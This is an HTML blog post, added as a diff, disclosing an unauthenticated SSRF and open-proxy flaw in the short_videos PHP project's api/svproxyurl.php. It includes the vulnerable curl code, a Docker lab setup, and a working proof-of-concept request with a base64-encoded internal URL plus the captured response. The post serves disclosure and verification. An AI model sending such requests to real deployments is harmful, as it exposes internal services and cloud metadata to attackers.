@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>short_videos ssrf Vulnerability | Lhz&#39;s blog</title>
+<meta name="keywords" content="CVE">
+<meta name="description" content="Title: Server-Side Request Forgery (SSRF) Vulnerability in short_videos via api/svproxyurl.php
+BUG_Author: liuhanzhi
+Affected Version: short_videos (latest unpatched version as of 2026-04-29)
+Vendor: short_videos GitHub Repository
+Software: short_videos
+Vulnerability Files:
+
+api/svproxyurl.php
+
+Description:
+
+
+Unauthenticated SSRF / Open Proxy in api/svproxyurl.php:
+
+In api/svproxyurl.php, the application accepts a user-controlled proxyurl parameter from $_GET or $_POST.
+The value is decoded by base64_decode() and then passed directly into CURLOPT_URL inside both weibo_proxy() and douyin_proxy().
+No authentication, host allowlist, private-network restriction, or redirect target validation is implemented.
+
+
+
+Cause of the vulnerability:">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/cveapplication2/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon.svg">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/cveapplication2/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Lhz&#39;s blog (Alt + H)">Lhz&#39;s blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      short_videos ssrf Vulnerability
+    </h1>
+    <div class="post-meta"><span title='2026-04-29 16:02:55 +0800 CST'>April 29, 2026</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="title-server-side-request-forgery-ssrf-vulnerability-in-short_videos-via-apisvproxyurlphp">Title: Server-Side Request Forgery (SSRF) Vulnerability in short_videos via <code>api/svproxyurl.php</code><a hidden class="anchor" aria-hidden="true" href="#title-server-side-request-forgery-ssrf-vulnerability-in-short_videos-via-apisvproxyurlphp">#</a></h2>
+<p><strong>BUG_Author:</strong> liuhanzhi</p>
+<p><strong>Affected Version:</strong> short_videos (latest unpatched version as of 2026-04-29)</p>
+<p><strong>Vendor:</strong> <a href="https://github.com/jiuhunwl/short_videos">short_videos GitHub Repository</a></p>
+<p><strong>Software:</strong> <a href="https://github.com/jiuhunwl/short_videos">short_videos</a></p>
+<p><strong>Vulnerability Files:</strong></p>
+<ul>
+<li><code>api/svproxyurl.php</code></li>
+</ul>
+<h2 id="description">Description:<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<ol>
+<li>
+<p><strong>Unauthenticated SSRF / Open Proxy in <code>api/svproxyurl.php</code>:</strong></p>
+<ul>
+<li>In <code>api/svproxyurl.php</code>, the application accepts a user-controlled <code>proxyurl</code> parameter from <code>$_GET</code> or <code>$_POST</code>.</li>
+<li>The value is decoded by <code>base64_decode()</code> and then passed directly into <code>CURLOPT_URL</code> inside both <code>weibo_proxy()</code> and <code>douyin_proxy()</code>.</li>
+<li>No authentication, host allowlist, private-network restriction, or redirect target validation is implemented.</li>
+</ul>
+</li>
+<li>
+<p><strong>Cause of the vulnerability:</strong></p>
+<ul>
+<li>The backend directly trusts the user-supplied target URL.</li>
+<li>The code allows the server to initiate outbound requests to arbitrary destinations.</li>
+<li>The response body is streamed back to the external requester, which makes the issue not only SSRF but also an open proxy behavior.</li>
+<li>The code enables <code>CURLOPT_FOLLOWLOCATION</code>, which may further expand the reachable target surface through redirects.</li>
+</ul>
+</li>
+<li>
+<p><strong>Affected code paths:</strong></p>
+<ul>
+<li><code>main()</code> reads and decodes <code>proxyurl</code>:
+<ul>
+<li><code>api/svproxyurl.php:18-29</code></li>
+</ul>
+</li>
+<li><code>weibo_proxy()</code> uses the attacker-controlled value as request destination:
+<ul>
+<li><code>api/svproxyurl.php:49-140</code></li>
+</ul>
+</li>
+<li><code>douyin_proxy()</code> uses the attacker-controlled value as request destination:
+<ul>
+<li><code>api/svproxyurl.php:143-235</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>An unauthenticated attacker can force the server to access internal network services.</li>
+<li>The vulnerability can be used for internal port discovery, access to internal HTTP services, and retrieval of internal responses.</li>
+<li>In real deployment scenarios, this may expose Docker internal services, localhost-only applications, cloud metadata endpoints, or other trusted network resources.</li>
+</ul>
+</li>
+<li>
+<p><strong>Why the issue is exploitable:</strong></p>
+<ul>
+<li>No login is required.</li>
+<li>The destination is user-controlled.</li>
+<li>The backend performs the request on behalf of the attacker.</li>
+<li>The backend returns the fetched response body to the attacker.</li>
+</ul>
+</li>
+</ol>
+<h2 id="vulnerable-code">Vulnerable Code:<a hidden class="anchor" aria-hidden="true" href="#vulnerable-code">#</a></h2>
+<ol>
+<li><strong>User-controlled <code>proxyurl</code> is read and decoded in <code>main()</code>:</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    $params <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;GET&#39;</span>) {
+</span></span><span style="display:flex;"><span>        $params <span style="color:#f92672">=</span> $_GET;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">elseif</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
+</span></span><span style="display:flex;"><span>        $params <span style="color:#f92672">=</span> $_POST;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $proxyurl <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">getParam</span>($params, <span style="color:#e6db74">&#39;proxyurl&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>));
+</span></span><span style="display:flex;"><span>    $type <span style="color:#f92672">=</span> <span style="color:#a6e22e">getParam</span>($params, <span style="color:#e6db74">&#39;type&#39;</span>, <span style="color:#e6db74">&#39;douyin&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($type <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;weibo&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">weibo_proxy</span>($proxyurl);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">douyin_proxy</span>($proxyurl);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol start="2">
+<li><strong>The attacker-controlled URL is directly assigned to <code>CURLOPT_URL</code> in <code>weibo_proxy()</code>:</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">curl_setopt_array</span>($ch, [
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_URL</span>            <span style="color:#f92672">=&gt;</span> $proxyurl,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_HTTPHEADER</span>     <span style="color:#f92672">=&gt;</span> $baseHeaders,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_FOLLOWLOCATION</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_SSL_VERIFYPEER</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_SSL_VERIFYHOST</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_TIMEOUT</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1800</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_CONNECTTIMEOUT</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">10</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_WRITEFUNCTION</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">function</span> ($ch, $data) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $data;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ob_get_length</span>() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">ob_flush</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">flush</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strlen</span>($data);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>]);
+</span></span></code></pre></div><ol start="3">
+<li><strong>The attacker-controlled URL is directly assigned to <code>CURLOPT_URL</code> in <code>douyin_proxy()</code>:</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">curl_setopt_array</span>($ch, [
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_URL</span> <span style="color:#f92672">=&gt;</span> $proxyurl,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_HTTPHEADER</span> <span style="color:#f92672">=&gt;</span> $baseHeaders,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_FOLLOWLOCATION</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_SSL_VERIFYPEER</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_SSL_VERIFYHOST</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_TIMEOUT</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">300</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_CONNECTTIMEOUT</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">10</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CURLOPT_WRITEFUNCTION</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">function</span> ($ch, $data) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $data;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ob_get_length</span>() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">ob_flush</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">flush</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strlen</span>($data);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>]);
+</span></span></code></pre></div><ol start="4">
+<li>
+<p><strong>Key security issues shown by the code:</strong></p>
+<ul>
+<li>The target URL is fully attacker-controlled.</li>
+<li>There is no allowlist validation for hosts or schemes beyond basic format checks.</li>
+<li>Internal IP ranges and localhost are not blocked.</li>
+<li>Redirections are followed.</li>
+<li>The response body is streamed back to the requester.</li>
+</ul>
+</li>
+</ol>
+<h1 id="local-verification">Local Verification<a hidden class="anchor" aria-hidden="true" href="#local-verification">#</a></h1>
+<ol>
+<li>Download the official source code:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/jiuhunwl/short_videos.git
+</span></span><span style="display:flex;"><span>cd short_videos
+</span></span></code></pre></div><ol start="2">
+<li>Create a <code>docker-compose.yml</code> file in the project root to start the vulnerable PHP application and an internal-only test service:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">web</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">php:8.2-apache</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">short-videos-web</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8080:80&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./:/var/www/html</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">audit_net</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ipv4_address</span>: <span style="color:#ae81ff">172.28.1.10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">whoami</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">traefik/whoami:v1.10</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">short-videos-whoami</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">audit_net</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ipv4_address</span>: <span style="color:#ae81ff">172.28.1.20</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">audit_net</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ipam</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">config</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">subnet</span>: <span style="color:#ae81ff">172.28.1.0</span><span style="color:#ae81ff">/24</span>
+</span></span></code></pre></div><ol start="3">
+<li>Start the Docker containers:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>docker compose up -d
+</span></span></code></pre></div><ol start="4">
+<li>Confirm the vulnerable endpoint is reachable:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;http://localhost:8080/api/svproxyurl.php&#34;</span>
+</span></span></code></pre></div><ol start="5">
+<li>Prepare a target URL that is only reachable from the Docker internal network:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>printf <span style="color:#e6db74">&#39;http://172.28.1.20/&#39;</span> | base64
+</span></span></code></pre></div><p>Expected output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>aHR0cDovLzE3Mi4yOC4xLjIwLw==
+</span></span></code></pre></div><ol start="6">
+<li>Send the verification request to the vulnerable endpoint:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;http://localhost:8080/api/svproxyurl.php?type=douyin&amp;proxyurl=aHR0cDovLzE3Mi4yOC4xLjIwLw==&#34;</span>
+</span></span></code></pre></div><h2 id="proof-of-concept">Proof of Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
+<ol>
+<li>Send the following request to the target:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /api/svproxyurl.php?type=douyin&amp;proxyurl=aHR0cDovLzE3Mi4yOC4xLjIwLw== <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">&lt;target-host&gt;</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span></code></pre></div><ol start="2">
+<li>Observe the response content. A successful response in the local Docker verification is shown below:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Hostname: f190864611a5
+</span></span><span style="display:flex;"><span>IP: 127.0.0.1
+</span></span><span style="display:flex;"><span>IP: ::1
+</span></span><span style="display:flex;"><span>IP: 172.28.1.20
+</span></span><span style="display:flex;"><span>RemoteAddr: 172.28.1.10:42598
+</span></span><span style="display:flex;"><span>GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 172.28.1.20
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept: video/mp4,video/x-m4v,video/*;q=0.9,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Accept-Language: zh-CN,zh;q=0.9
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Referer: https://douyin.com/
+</span></span></code></pre></div><ol start="3">
+<li>
+<p>Verification points:</p>
+<ul>
+<li>The external request is sent to <code>http://localhost:8080</code>, not directly to <code>172.28.1.20</code>.</li>
+<li>The returned body is generated by the internal <code>whoami</code> container.</li>
+<li><code>RemoteAddr: 172.28.1.10:42598</code> proves the request to the internal service was initiated by the vulnerable PHP container.</li>
+<li><code>Host: 172.28.1.20</code> proves the backend reached the Docker internal address.</li>
+</ul>
+</li>
+<li>
+<p>Conclusion:</p>
+<ul>
+<li>The endpoint can be abused by an unauthenticated attacker to make the server access arbitrary internal HTTP resources and return the response.</li>
+<li>This confirms a valid SSRF vulnerability with open proxy behavior.</li>
+</ul>
+</li>
+</ol>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/cve/">CVE</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Lhz&#39;s blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
